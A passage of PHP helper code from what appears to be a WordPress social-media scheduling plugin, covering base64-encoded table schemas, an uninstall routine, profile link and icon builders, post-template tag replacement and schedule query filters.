yZXFgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGZpbHRlcl9wb3N0c19kYXRlX3JhbmdlX2Zyb21gIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGZpbHRlcl9wb3N0c19kYXRlX3JhbmdlX3RvYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBwb3N0X2RhdGVfZmlsdGVyYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBwb3N0X2lkc2AgbG9uZ3RleHQgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgbmV4dF9leGVjdXRlX3RpbWVgIHZhcmNoYXIoMjAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBjdXN0b21fcG9zdF9tZXNzYWdlYCBsb25ndGV4dCBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBzaGFyZV9vbl9hY2NvdW50c2AgbG9uZ3RleHQgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgc2xlZXBfdGltZV9zdGFydGAgdmFyY2hhcigzMDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHNsZWVwX3RpbWVfZW5kYCB2YXJjaGFyKDMwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgc2hhcmVfb25fYmFja2dyb3VuZGAgdmFyY2hhcigzMDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHNjaGVkdWxlX2NvdW50YCB2YXJjaGFyKDMwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgc3RhcnRfdGltZWAgZGF0ZSBERUZBVUxUIE5VTEwsDQogIGBzYXZlX3Bvc3RfaWRzYCBsb25ndGV4dCBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBibG9nX2lkYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBkb250X3Bvc3Rfb3V0X29mX3N0b2NrX3Byb2R1Y3RzYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwNCikgRU5HSU5FPUlubm9EQiBERUZBVUxUIENIQVJTRVQ9dXRmOG1iNCBDT0xMQVRFPXV0ZjhtYjRfdW5pY29kZV9jaSBST1dfRk9STUFUPUNPTVBSRVNTRUQ7DQoNCkFMVEVSIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudHNgIEFERCBQUklNQVJZIEtFWSAoYGlkYCkgVVNJTkcgQlRSRUU7DQoNCkFMVEVSIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudF9hY2Nlc3NfdG9rZW5zYCBBREQgUFJJTUFSWSBLRVkgKGBpZGApIFVTSU5HIEJUUkVFOw0KDQpBTFRFUiBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfbm9kZXNgIEFERCBQUklNQVJZIEtFWSAoYGlkYCkgVVNJTkcgQlRSRUU7DQoNCkFMVEVSIFRBQkxFIGB7dGFibGVwcmVmaXh9YXBwc2AgQUREIFBSSU1BUlkgS0VZIChgaWRgKSBVU0lORyBCVFJFRTsNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1mZWVkc2AgQUREIFBSSU1BUlkgS0VZIChgaWRgKSBVU0lORyBCVFJFRTsNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1zY2hlZHVsZXNgIEFERCBQUklNQVJZIEtFWSAoYGlkYCkgVVNJTkcgQlRSRUU7DQoNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1hY2NvdW50c2AgTU9ESUZZIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVDsNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1hY2NvdW50X2FjY2Vzc190b2tlbnNgIE1PRElGWSBgaWRgIGludCgxMSkgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQ7DQoNCkFMVEVSIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudF9ub2Rlc2AgTU9ESUZZIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVDsNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1hcHBzYCBNT0RJRlkgYGlkYCBpbnQoMTEpIE5PVCBOVUxMIEFVVE9fSU5DUkVNRU5ULCBBVVRPX0lOQ1JFTUVOVD0xMjsNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1mZWVkc2AgTU9ESUZZIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVDsNCg0KQUxURVIgVEFCTEUgYHt0YWJsZXByZWZpeH1zY2hlZHVsZXNgIE1PRElGWSBgaWRgIGludCgxMSkgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQ7DQoNCiMNCiMgbGdva3VsIHRhYmxlcw0KIw0KDQpDUkVBVEUgVEFCTEUgYHt0YWJsZXByZWZpeH1hY2NvdW50X3N0YXR1c2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGBhY2NvdW50X2lkYCBpbnQoMTEpIE5PVCBOVUxMLA0KICBgdXNlcl9pZGAgaW50KDExKSBERUZBVUxUIE5VTEwsDQogIGBmaWx0ZXJfdHlwZWAgdmFyY2hhcig1MCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgY2F0ZWdvcmllc2AgdmFyY2hhcig1MDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTA0KKSBFTkdJTkU9SW5ub0RCIERFRkFVTFQgQ0hBUlNFVD11dGY4bWI0IENPTExBVEU9dXRmOG1iNF91bmljb2RlX2NpIFJPV19GT1JNQVQ9Q09NUFJFU1NFRDsNCg0KQ1JFQVRFIFRBQkxFIGB7dGFibGVwcmVmaXh9Z3JvdXBlZF9hY2NvdW50c2AgKA0KICBgYWNjb3VudF9pZGAgaW50KDExKSBOT1QgTlVMTCwNCiAgYGFjY291bnRgIGludCgxMSkgTk9UIE5VTEwsDQogIGBhY2NvdW50X3R5cGVgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHVzZXJfaWRgIGludCgxMSkgTk9UIE5VTEwNCikgRU5HSU5FPUlubm9EQiBERUZBVUxUIENIQVJTRVQ9dXRmOG1iNCBDT0xMQVRFPXV0ZjhtYjRfdW5pY29kZV9jaSBST1dfRk9STUFUPUNPTVBSRVNTRUQ7DQoNCkNSRUFURSBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfbm9kZV9zdGF0dXNgICgNCiAgYGlkYCBpbnQoMTEpIE5PVCBOVUxMLA0KICBgbm9kZV9pZGAgdmFyY2hhcigzMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgdXNlcl9pZGAgaW50KDExKSBERUZBVUxUIE5VTEwsDQogIGBmaWx0ZXJfdHlwZWAgdmFyY2hhcig1MCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgY2F0ZWdvcmllc2AgdmFyY2hhcigyNTUpIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTA0KKSBFTkdJTkU9SW5ub0RCIERFRkFVTFQgQ0hBUlNFVD11dGY4bWI0IENPTExBVEU9dXRmOG1iNF91bmljb2RlX2NpIFJPV19GT1JNQVQ9Q09NUEFDVDsNCg0KQ1JFQVRFIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudF9zZXNzaW9uc2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGBkcml2ZXJgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHVzZXJuYW1lYCB2YXJjaGFyKDI1NSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgc2V0dGluZ3NgIGxvbmd0ZXh0IENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGNvb2tpZXNgIGxvbmd0ZXh0IENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTA0KKSBFTkdJTkU9SW5ub0RCIERFRkFVTFQgQ0hBUlNFVD11dGY4bWI0IENPTExBVEU9dXRmOG1iNF91bmljb2RlX2NpIFJPV19GT1JNQVQ9Q09NUFJFU1NFRDsNCg0KDQpBTFRFUiBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfc3RhdHVzYCBBREQgUFJJTUFSWSBLRVkgKGBpZGApIFVTSU5HIEJUUkVFOw0KDQpBTFRFUiBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfbm9kZV9zdGF0dXNgIEFERCBQUklNQVJZIEtFWSAoYGlkYCkgVVNJTkcgQlRSRUU7DQoNCkFMVEVSIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudF9zZXNzaW9uc2AgQUREIFBSSU1BUlkgS0VZIChgaWRgKSBVU0lORyBCVFJFRTsNCg0KDQpBTFRFUiBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfc3RhdHVzYCBNT0RJRlkgYGlkYCBpbnQoMTEpIE5PVCBOVUxMIEFVVE9fSU5DUkVNRU5UOw0KDQpBTFRFUiBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfbm9kZV9zdGF0dXNgIE1PRElGWSBgaWRgIGludCgxMSkgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQ7DQoNCkFMVEVSIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudF9zZXNzaW9uc2AgTU9ESUZZIGBpZGAgaW50KDExKSBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVDsNCg=="}';

		$fsTables = [
			'account_access_tokens',
			'account_groups',
			'account_groups_data',
			'account_node_status',
			'account_nodes',
			'account_sessions',
			'account_status',
			'grouped_accounts',
			'accounts',
			'apps',
			'feeds',
			'schedules'
		];

		foreach ( $fsTables as $tableName )
		{
			DB::DB()->query( "DROP TABLE IF EXISTS `" . DB::table( $tableName ) . "`" );
		}

// delete options...
// fix lgokul unistall
		$fsOptions = [
			'poster_plugin_installed',
			'poster_plugin_purchase_key',
			'plugin_alert',
			'plugin_disabled',
			'grouped_accounts',
			'fs_poster_plugin_installed',
			'fs_grouped_accounts',
			'allowed_post_types',
			'facebook_posting_type',
			'hide_menu_for',
			'keep_logs',
			'ok_posting_type',
			'share_on_background',
			'share_timer',
			'twitter_auto_cut_tweets',
			'twitter_posting_type',
			'vk_upload_image',
			'instagram_post_in_type',
			'load_groups',
			'load_own_pages',
			'post_interval',
			'post_interval_type',
			'post_text_message_fb',
			'post_text_message_instagram',
			'post_text_message_instagram_h',
			'post_text_message_linkedin',
			'post_text_message_ok',
			'post_text_message_pinterest',
			'post_text_message_reddit',
			'post_text_message_tumblr',

			'google_b_share_as_product',
			'google_b_button_type',
			'post_text_message_google_b',

			'post_text_message_twitter',
			'post_text_message_vk',
			'post_text_message_telegram',
			'telegram_type_of_sharing',
			'shortener_service',
			'unique_link',
			'url_shortener',
			'url_short_access_token_bitly',
			'vk_load_admin_communities',
			'vk_load_members_communities',
			'collect_statistics',
			'url_additional',
			'post_text_message_medium',
			'share_custom_url',
			'custom_url_to_share',

			'wordpress_post_with_categories',
			'wordpress_post_with_tags',
			'post_title_wordpress',
			'post_excerpt_wordpress',
			'post_text_message_wordpress'

		];

		foreach ( $fsOptions as $optionName )
		{
		    // fix delete lgokul #2
		    delete_option($optionName);
			Helper::deleteOption( $optionName );
		}
// fix lgokul unistall
		DB::DB()->query( "DELETE FROM " . DB::WPtable( 'posts', TRUE ) . " WHERE post_type='fs_post_tmp' OR post_type='fs_post'" );
	}

	public static function socialIcon ( $driver )
	{
		switch ( $driver )
		{
			case 'fb':
				return "fab fa-facebook-f";
			case 'twitter':
			case 'wordpress':
			case 'medium':
			case 'reddit':
			case 'telegram':
			case 'pinterest':
			case 'linkedin':
			case 'vk':
			case 'instagram':
			case 'tumblr':
			case 'blogger':
				return "fab fa-{$driver}";
			case 'ok':
				return "fab fa-odnoklassniki";
			case 'google_b':
				return "fab fa-google";
		}
	}

	public static function standartAppRedirectURL ( $social_network )
	{
		$fsPurchaseKey = Helper::getOption( 'poster_plugin_purchase_key', '', TRUE );

		return FS_API_URL . '?purchase_code=' . $fsPurchaseKey . '&domain=' . network_site_url() . '&sn=' . $social_network . '&r_url=' . urlencode( site_url() . '/?fs_app_redirect=1&sn=' . $social_network );
	}

	public static function profilePic ( $info, $w = 40, $h = 40 )
	{
		if ( ! isset( $info[ 'driver' ] ) )
		{
			return '';
		}

		if ( empty( $info ) )
		{
			return Pages::asset( 'Base', 'img/no-photo.png' );
		}

		if ( is_array( $info ) && key_exists( 'cover', $info ) ) // nodes
		{
			if ( ! empty( $info[ 'cover' ] ) )
			{
				return $info[ 'cover' ];
			}
			else
			{
				if ( $info[ 'driver' ] === 'fb' )
				{
					return "https://graph.facebook.com/" . esc_html( $info[ 'node_id' ] ) . "/picture?redirect=1&height={$h}&width={$w}&type=normal";
				}
				else if ( $info[ 'driver' ] === 'instagram' )
				{
					return Pages::asset( 'Base', 'img/no-photo.png' );
				}
				else if ( $info[ 'driver' ] === 'tumblr' )
				{
					return "https://api.tumblr.com/v2/blog/" . esc_html( $info[ 'node_id' ] ) . "/avatar/" . ( $w > $h ? $w : $h );
				}
				else if ( $info[ 'driver' ] === 'reddit' )
				{
					return "https://www.redditstatic.com/avatars/avatar_default_10_25B79F.png";
				}
				else if ( $info[ 'driver' ] === 'google_b' )
				{
					return "https://ssl.gstatic.com/images/branding/product/2x/google_my_business_32dp.png";
				}
				else if ( $info[ 'driver' ] === 'blogger' )
				{
					return 'https://www.blogger.com/img/logo_blogger_40px.png';
				}
				else if ( $info[ 'driver' ] === 'telegram' )
				{
					return Pages::asset( 'Base', 'img/telegram.svg' );
				}
				else if ( $info[ 'driver' ] === 'linkedin' )
				{
					return Pages::asset( 'Base', 'img/no-photo.png' );
				}
			}
		}
		else
		{
			if ( $info[ 'driver' ] === 'fb' )
			{
				return "https://graph.facebook.com/" . esc_html( $info[ 'profile_id' ] ) . "/picture?redirect=1&height={$h}&width={$w}&type=normal";
			}
			else if ( $info[ 'driver' ] === 'twitter' )
			{
				static $twitter_appInfo;

				if ( is_null( $twitter_appInfo ) )
				{
					$twitter_appInfo = DB::fetch( 'apps', [ 'driver' => 'twitter' ] );
				}

				$connection = new TwitterOAuth( $twitter_appInfo[ 'app_key' ], $twitter_appInfo[ 'app_secret' ] );
				$user       = $connection->get( "users/show", [ 'screen_name' => $info[ 'username' ] ] );

				return str_replace( 'http://', 'https://', $user->profile_image_url );
			}
			else if ( $info[ 'driver' ] === 'instagram' )
			{
				if ( $info[ 'password' ] == '#####' )
				{
					return "https://graph.facebook.com/" . esc_html( $info[ 'profile_id' ] ) . "/picture?redirect=1&height={$h}&width={$w}&type=normal";
				}

				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'linkedin' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'vk' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'pinterest' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'reddit' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'tumblr' )
			{
				return "https://api.tumblr.com/v2/blog/" . esc_html( $info[ 'username' ] ) . "/avatar/" . ( $w > $h ? $w : $h );
			}
			else if ( $info[ 'driver' ] === 'ok' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'google_b' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'blogger' )
			{
				return empty( $info[ 'profile_pic' ] ) ? 'https://www.blogger.com/img/avatar_blue_m_96.png' : $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'telegram' )
			{
				return Pages::asset( 'Base', 'img/telegram.svg' );
			}
			else if ( $info[ 'driver' ] === 'medium' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'wordpress' )
			{
				return $info[ 'profile_pic' ];
			}
			else if ( $info[ 'driver' ] === 'plurk' )
			{
				return $info[ 'profile_pic' ];
			}
		}
	}

	public static function profileLink ( $info )
	{
		if ( ! isset( $info[ 'driver' ] ) )
		{
			return '';
		}

		// IF NODE
		if ( is_array( $info ) && key_exists( 'cover', $info ) ) // nodes
		{
			if ( $info[ 'driver' ] === 'fb' )
			{
				return "https://fb.com/" . esc_html( $info[ 'node_id' ] );
			}
			else if ( $info[ 'driver' ] === 'instagram' )
			{
				return "https://instagram.com/" . esc_html( $info[ 'screen_name' ] );
			}
			else if ( $info[ 'driver' ] === 'vk' )
			{
				return "https://vk.com/" . esc_html( $info[ 'screen_name' ] );
			}
			else if ( $info[ 'driver' ] === 'tumblr' )
			{
				return "https://" . esc_html( $info[ 'screen_name' ] ) . ".tumblr.com";
			}
			else if ( $info[ 'driver' ] === 'linkedin' )
			{
				return "https://www.linkedin.com/company/" . esc_html( $info[ 'node_id' ] );
			}
			else if ( $info[ 'driver' ] === 'ok' )
			{
				return "https://ok.ru/group/" . esc_html( $info[ 'node_id' ] );
			}
			else if ( $info[ 'driver' ] === 'reddit' )
			{
				return "https://www.reddit.com/r/" . esc_html( $info[ 'screen_name' ] );
			}
			else if ( $info[ 'driver' ] === 'google_b' )
			{
				return "https://business.google.com/posts/l/" . esc_html( $info[ 'node_id' ] );
			}
			else if ( $info[ 'driver' ] === 'blogger' )
			{
				return $info[ 'screen_name' ];
			}
			else if ( $info[ 'driver' ] === 'telegram' )
			{
				return "http://t.me/" . esc_html( $info[ 'screen_name' ] );
			}
			else if ( $info[ 'driver' ] === 'pinterest' )
			{
				return "https://www.pinterest.com/" . esc_html( $info[ 'screen_name' ] );
			}
			else if ( $info[ 'driver' ] === 'medium' )
			{
				return "https://medium.com/" . esc_html( $info[ 'screen_name' ] );
			}

			return '';
		}

		if ( $info[ 'driver' ] === 'fb' )
		{
			if ( empty( $info[ 'options' ] ) )
			{
				$info[ 'profile_id' ] = 'me';
			}

			return "https://fb.com/" . esc_html( $info[ 'profile_id' ] );
		}
		else if ( $info[ 'driver' ] === 'plurk' )
		{
			return "https://plurk.com/" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'twitter' )
		{
			return "https://twitter.com/" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'instagram' )
		{
			if ( $info[ 'password' ] == '#####' )
			{
				return 'https://fb.com/me';
			}

			return "https://instagram.com/" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'linkedin' )
		{
			return "https://www.linkedin.com/in/" . esc_html( str_replace( [
					'https://www.linkedin.com/in/',
					'http://www.linkedin.com/in/'
				], '', $info[ 'username' ] ) );
		}
		else if ( $info[ 'driver' ] === 'vk' )
		{
			return "https://vk.com/id" . esc_html( $info[ 'profile_id' ] );
		}
		else if ( $info[ 'driver' ] === 'pinterest' )
		{
			return "https://www.pinterest.com/" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'reddit' )
		{
			return "https://www.reddit.com/u/" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'tumblr' )
		{
			return "https://" . esc_html( $info[ 'username' ] ) . ".tumblr.com";
		}
		else if ( $info[ 'driver' ] === 'ok' )
		{
			return 'https://ok.ru/profile/' . urlencode( $info[ 'profile_id' ] );
		}
		else if ( $info[ 'driver' ] === 'google_b' )
		{
			return 'https://business.google.com/locations';
		}
		else if ( $info[ 'driver' ] === 'blogger' )
		{
			return 'https://www.blogger.com/profile/' . $info[ 'profile_id' ];
		}
		else if ( $info[ 'driver' ] === 'telegram' )
		{
			return "https://t.me/" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'medium' )
		{
			return "https://medium.com/@" . esc_html( $info[ 'username' ] );
		}
		else if ( $info[ 'driver' ] === 'wordpress' )
		{
			return $info[ 'options' ];
		}
	}

	public static function appIcon ( $appInfo )
	{
		if ( $appInfo[ 'driver' ] === 'fb' )
		{
			return "https://graph.facebook.com/" . esc_html( $appInfo[ 'app_id' ] ) . "/picture?redirect=1&height=40&width=40&type=small";
		}
		else
		{
			return Pages::asset( 'Base', 'img/app_icon.svg' );
		}
	}

	public static function replacePartOfTags ( $message, $postInf )
	{
		$postInf[ 'post_content' ] = Helper::removePageBuilderShortcodes( $postInf[ 'post_content' ] );

		$message = preg_replace_callback( '/\{content_short_?([0-9]+)?\}/', function ( $n ) use ( $postInf ) {
			if ( isset( $n[ 1 ] ) && is_numeric( $n[ 1 ] ) )
			{
				$cut = $n[ 1 ];
			}
			else
			{
				$cut = 40;
			}

			return Helper::cutText( strip_tags( $postInf[ 'post_content' ] ), $cut );
		}, $message );

		$message = preg_replace_callback( '/\{cf_(.+)\}/iU', function ( $n ) use ( $postInf ) {
			$customField = isset( $n[ 1 ] ) ? $n[ 1 ] : '';

			return get_post_meta( $postInf[ 'ID' ], $customField, TRUE );
		}, $message );

		return $message;
	}

	public static function replaceTags ( $message, $postInf, $link, $shortLink )
	{
		$message  = self::replacePartOfTags( $message, $postInf );
		$getPrice = Helper::getProductPrice( $postInf );

		$productRegularPrice = $getPrice[ 'regular' ];
		$productSalePrice    = $getPrice[ 'sale' ];

		$productCurrentPrice = ( isset( $productSalePrice ) && ! empty( $productSalePrice ) ) ? $productSalePrice : $productRegularPrice;

		$mediaId = get_post_thumbnail_id( $postInf[ 'ID' ] );

		if ( empty( $mediaId ) )
		{
			$media   = get_attached_media( 'image', $postInf[ 'ID' ] );
			$first   = reset( $media );
			$mediaId = isset( $first->ID ) ? $first->ID : 0;
		}

		$featuredImage = $mediaId > 0 ? wp_get_attachment_url( $mediaId ) : '';

		return str_replace( [
			'{id}',
			'{title}',
			'{title_ucfirst}',
			'{content_full}',
			'{link}',
			'{short_link}',
			'{product_regular_price}',
			'{product_sale_price}',
			'{product_current_price}',
			'{uniq_id}',
			'{tags}',
			'{categories}',
			'{excerpt}',
			'{author}',
			'{featured_image_url}',
		], [
			$postInf[ 'ID' ],
			$postInf[ 'post_title' ],
			ucfirst( mb_strtolower( $postInf[ 'post_title' ] ) ),
			$postInf[ 'post_content' ],
			$link,
			$shortLink,
			$productRegularPrice,
			$productSalePrice,
			$productCurrentPrice,
			uniqid(),
			Helper::getPostTags( $postInf, TRUE, FALSE ),
			Helper::getPostCats( $postInf ),
			$postInf[ 'post_excerpt' ],
			get_the_author_meta( 'display_name', $postInf[ 'post_author' ] ),
			$featuredImage,
		], $message );
	}

	public static function replaceAltTextTags ( $message, $postInf )
	{
		$message = self::replacePartOfTags( $message, $postInf );
		$mediaId = get_post_thumbnail_id( $postInf[ 'ID' ] );
		$altText = get_post( $mediaId );

		return str_replace( [
			'{site_name}',
			'{media_caption}',
			'{media_description}',
			'{media_name}',
			'{title}',
			'{tags}',
			'{excerpt}'
		], [
			get_bloginfo( 'name' ),
			$altText->post_excerpt,
			$altText->post_content,
			$altText->post_name,
			$postInf[ 'post_title' ],
			Helper::getPostTags( $postInf, TRUE, FALSE ),
			$postInf[ 'post_excerpt' ],
		], $message );
	}

	public static function scheduleFilters ( $schedule_info )
	{
		$scheduleId = $schedule_info[ 'id' ];

		/* Post type filter */
		$_postTypeFilter = $schedule_info[ 'post_type_filter' ];

		$allowedPostTypes = explode( '|', Helper::getOption( 'allowed_post_types', 'post|page|attachment|product' ) );

		if ( ! in_array( $_postTypeFilter, $allowedPostTypes ) )
		{
			$_postTypeFilter = '';
		}

		$_postTypeFilter = esc_sql( $_postTypeFilter );

		if ( ! empty( $_postTypeFilter ) )
		{
			$postTypeFilter = "AND post_type='" . $_postTypeFilter . "'";

			if ( $_postTypeFilter === 'product' && isset( $schedule_info[ 'dont_post_out_of_stock_products' ] ) && $schedule_info[ 'dont_post_out_of_stock_products' ] == 1 && function_exists( 'wc_get_product' ) )
			{
				$postTypeFilter .= ' AND IFNULL((SELECT `meta_value` FROM `' . DB::WPtable( 'postmeta', TRUE ) . '` WHERE `post_id`=tb1.id AND `meta_key`=\'_stock_status\'), \'\')<>\'outofstock\'';
			}
		}
		else
		{
			$post_types = "'" . implode( "','", array_map( 'esc_sql', $allowedPostTypes ) ) . "'";

			$postTypeFilter = "AND `post_type` IN ({$post_types})";
		}
		/* /End of post type filer */

		/* Categories filter */
		$categories_arr    = explode( '|', $schedule_info[ 'category_filter' ] );
		$categories_arrNew = [];

		foreach ( $categories_arr as $categ )
		{
			if ( is_numeric( $categ ) && $categ > 0 )
			{
				$categInf = get_term( (int) $categ );

				if ( ! $categInf )
				{
					continue;
				}

				$categories_arrNew[] = (int) $categ;

				// get sub categories
				$child_cats = get_categories( [
					'taxonomy'   => $categInf->taxonomy,
					'child_of'   => (int) $categ,
					'hide_empty' => FALSE
				] );

				foreach ( $child_cats as $child_cat )
				{
					$categories_arrNew[] = (int) $child_cat->term_id;
				}
			}
		}

		$categories_arr = $categories_arrNew;

		unset( $categories_arrNew );

		if ( empty( $categories_arr ) )
		{
			$categoriesFilter = '';
		}
		else
		{
			$get_taxs = DB::DB()->get_col( DB::DB()->prepare( "SELECT `term_taxonomy_id` FROM `" . DB::WPtable( 'term_taxonomy', TRUE ) . "` WHERE `term_id` IN ('" . implode( "' , '", $categories_arr ) . "')" ), 0 );

			$categoriesFilter = " AND `id` IN ( SELECT object_id FROM `" . DB::WPtable( 'term_relationships', TRUE ) . "` WHERE term_taxonomy_id IN ('" . implode( "' , '", $get_taxs ) . "') ) ";
		}
		/* / End of Categories filter */

		/* post_date_filter */
		switch ( $schedule_info[ 'post_date_filter' ] )
		{
			case "this_week":
				$week = Date::format( 'w' );
				$week = $week == 0 ? 7 : $week;

				$startDateFilter = Date::format( 'Y-m-d 00:00', '-' . ( $week - 1 ) . ' day' );
				$endDateFilter   = Date::format( 'Y-m-d 23:59' );
				break;
			case "previously_week":
				$week = Date::format( 'w' );
				$week = $week == 0 ? 7 : $week;
				$week += 7;

				$startDateFilter = Date::format( 'Y-m-d 00:00', '-' . ( $week - 1 ) . ' day' );
				$endDateFilter   = Date::format( 'Y-m-d 23:59', '-' . ( $week - 7 ) . ' day' );
				break;
			case "this_month":
				$startDateFilter = Date::format( 'Y-m-01 00:00' );
				$endDateFilter   = Date::format( 'Y-m-t 23:59' );
				break;
			case "previously_month":
				$startDateFilter = Date::format( 'Y-m-01 00:00', '-1 month' );
				$endDateFilter   = Date::format( 'Y-m-t 23:59', '-1 month' );
				break;
			case "this_year":
				$startDateFilter = Date::format( 'Y-01-01 00:00' );
				$endDateFilter   = Date::format( 'Y-12-31 23:59' );
				break;
			case "last_30_days":
				$startDateFilter = Date::format( 'Y-m-d 00:00', '-30 day' );
				$endDateFilter   = Date::format( 'Y-m-d 23:59' );
				break;
			case "last_60_days":
				$startDateFilter = Date::format( 'Y-m-d 00:00', '-60 day' );
				$endDateFilter   = Date::format( 'Y-m-d 23:59' );
				break;
			case "custom":
				$startDateFilter = Date::format( 'Y-m-d 00:00', $schedule_info[ 'filter_posts_date_range_from' ] );
				$endDateFilter   = Date::format( 'Y-m-d 23:59', $schedule_info[ 'filter_posts_date_range_to' ] );
				break;
		}

		$dateFilter = "";

		if ( isset( $startDateFilter ) && isset( $endDateFilter ) )
		{
			$dateFilter = " AND post_date BETWEEN '{$startDateFilter}' AND '{$endDateFilter}'";
		}
		/* End of post_date_filter */

		/* Filter by id */
		$postIDs      = explode( ',', $schedule_info[ 'post_ids' ] );
		$postIDFilter = [];

		foreach ( $postIDs as $post_id1 )
		{
			if ( is_numeric( $post_id1 ) && $post_id1 > 0 )
			{
				$postIDFilter[] = (int) $post_id1;
			}
		}

		if ( empty( $postIDFilter ) )
		{
			$postIDFilter = '';
		}
		else
		{
			$postIDFilter   = " AND id IN ('" . implode( "','", $postIDFilter ) . "') ";
			$postTypeFilter = '';
		}

		/* End ofid filter */

		/* post_sort */
		$sortQuery = '';

		if ( $scheduleId > 0 )
		{
			switch ( $schedule_info[ 'post_sort' ] )
			{
				case "random":
					$sortQuery .= 'ORDER BY RAND()';
					break;
				case "random2":
					$sortQuery .= ' AND id NOT IN (SELECT post_id FROM `' . DB::table( 'feeds' ) . "` WHERE schedule_id='" . (int) $scheduleId . "') ORDER BY RAND()";
					break;
				case "old_first":
